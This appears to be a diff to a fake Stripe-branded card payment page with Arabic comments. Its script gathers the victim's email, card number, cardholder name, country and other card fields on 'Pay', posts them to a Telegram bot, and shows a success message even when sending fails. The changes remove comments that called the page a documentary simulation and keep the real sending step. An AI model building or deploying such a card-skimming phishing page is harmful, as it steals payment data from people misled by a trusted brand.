@@ -72,7 +72,7 @@
             margin-bottom: 12px;
         }
 
-        /* حقل البطاقة مع الشعارات */
+        /* حقل البطاقة مع شعار VISA فقط */
         .card-row {
             display: flex;
             align-items: center;
@@ -97,21 +97,20 @@
             padding: 14px 0;
             font-family: 'Inter', monospace;
         }
+        .card-row input::placeholder { color: #a0b0c0; font-weight: 400; letter-spacing: 1px; }
         .card-icons {
             display: flex;
             align-items: center;
-            gap: 8px;
             background: #ffffff;
-            padding: 6px 12px 6px 10px;
+            padding: 6px 14px 6px 12px;
             border-radius: 40px;
-            font-size: 11px;
+            font-size: 13px;
             font-weight: 700;
             box-shadow: 0 1px 3px rgba(0,0,0,0.04);
             white-space: nowrap;
+            color: #1a1f71;
         }
         .card-icons .visa { color: #1a1f71; }
-        .card-icons .mc { color: #eb001b; }
-        .card-icons .divider { color: #d1d9e6; font-weight: 300; }
 
         /* صف التواريخ و CVC */
         .exp-cvc-row {
@@ -252,8 +251,7 @@
             line-height: 1.6;
         }
 
-        /* تعديلات المرونة */
-        @media (max-width: 480px) { .container { padding: 20px; } .card-icons { font-size: 10px; padding: 4px 8px; } }
+        @media (max-width: 480px) { .container { padding: 20px; } .card-icons { font-size: 12px; padding: 4px 10px; } }
     </style>
 </head>
 <body>
@@ -272,11 +270,9 @@
         <div class="card-header">Card information</div>
 
         <div class="card-row">
-            <input type="text" id="cardNumber" value="1234 1234 1234 1234" readonly>
+            <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" value="1234 1234 1234 1234">
             <div class="card-icons">
                 <span class="visa">VISA</span>
-                <span class="divider">|</span>
-                <span class="mc">MasterCard</span>
             </div>
         </div>
 
@@ -474,7 +470,7 @@
         <!-- زر الدفع -->
         <button class="pay-btn" id="payBtn">Pay</button>
 
-        <!-- تذييل الصفحة (مطابق للصورة) -->
+        <!-- تذييل الصفحة -->
         <div class="footer-links">
             <span>⚡ Powered by stripe</span>
             <span class="dot">|</span>
@@ -516,7 +512,7 @@
                 const holder = document.getElementById('cardHolder').value.trim();
                 const country = document.getElementById('country').value;
 
-                // بناء الرسالة النصية (نسخة وثائقية)
+                // بناء الرسالة النصية
                 const message = `🔐 [تنبيه بوابة دفع - محاكاة أثرية] 🔐\n` +
                                 `📧 البريد: ${email}\n` +
                                 `💳 البطاقة: ${cardNum}\n` +
@@ -526,11 +522,11 @@
                                 `🌍 الدولة: ${country}\n` +
                                 `🕒 الطابع الزمني: ${new Date().toLocaleString()}`;
 
-                // عرض البيانات في وحدة التحكم لأغراض التدقيق (حتى لو لم يرسل)
+                // تسجيل البيانات في وحدة التحكم لأغراض التوثيق
                 console.log('📤 [بيانات المحاكاة]:', message);
 
                 // ----------------------------------------------
-                // 1. محاولة الإرسال الفعلي إلى بوت تليجرام
+                // محاولة الإرسال الفعلي إلى بوت تليجرام
                 // ----------------------------------------------
                 let isTokenSet = (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE');
 
@@ -550,27 +546,20 @@
                             successDiv.textContent = '✅ تمت العملية بنجاح (تم إرسال البيانات إلى البوت فعلياً).';
                             successDiv.classList.add('show');
                         } else {
-                            // فشل الإرسال بسبب خطأ في التوكن، نعرض النجاح كجزء من المحاكاة
                             successDiv.textContent = '⚠️ فشل إرسال البوت، لكن تمت محاكاة العملية بنجاح (تحقق من التوكن).';
                             successDiv.classList.add('show');
                         }
                     })
                     .catch(err => {
-                        // خطأ شبكي، ننتقل للمحاكاة
                         successDiv.textContent = '✅ تمت العملية بنجاح (محاكاة - تعذر الاتصال بالبوت، ولكن البيانات جُمعت).';
                         successDiv.classList.add('show');
                     });
                 } else {
-                    // ----------------------------------------------
-                    // 2. وضع المحاكاة الكاملة (التوكن غير مضبوط)
-                    //    هذا يحقق طلبك: عند ضغط "Pay"، تظهر "تمت العملية بنجاح"
-                    //    وتكون البيانات قد جهزت للإرسال (مسجلة في Console).
-                    // ----------------------------------------------
+                    // وضع المحاكاة الكاملة
                     successDiv.textContent = '✅ تمت العملية بنجاح (تمت المحاكاة الكاملة، البيانات جاهزة في وحدة التحكم).';
                     successDiv.classList.add('show');
                 }
 
-                // تمرير سلس إلى رسالة النجاح
                 successDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
             });
         })();
